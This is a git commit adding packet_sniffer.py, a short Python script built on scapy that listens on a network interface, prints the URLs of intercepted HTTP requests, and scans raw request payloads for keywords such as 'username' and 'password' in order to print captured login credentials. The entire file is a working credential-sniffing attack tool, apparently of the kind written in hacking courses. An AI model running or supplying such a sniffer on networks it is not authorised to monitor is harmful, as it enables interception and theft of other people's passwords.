6c9316b8a8af535c171f68d79950c71cdc420819
sujithtadi <84928654+sujithtadi@users.noreply.github.com>
2021-05-28 14:37:25 +0530

    Add files via upload

---
+++ packet_sniffer.py
@@ -0,0 +1,31 @@
+from logging import log
+import logging
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+          load=str(packet[scapy.Raw].load)
+          keywords=["uname","username","login","user","password","pass"]
+          for keyword in keywords:
+              if keyword in load:
+                  return load
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        #print(packet.show())
+        url = get_url(packet)
+        print("[+] HTTP Rquest:"+str(url))#url.decode()
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible usernames and passwords:"+login_info+"\n\n")
+
+sniff("enp0s3")
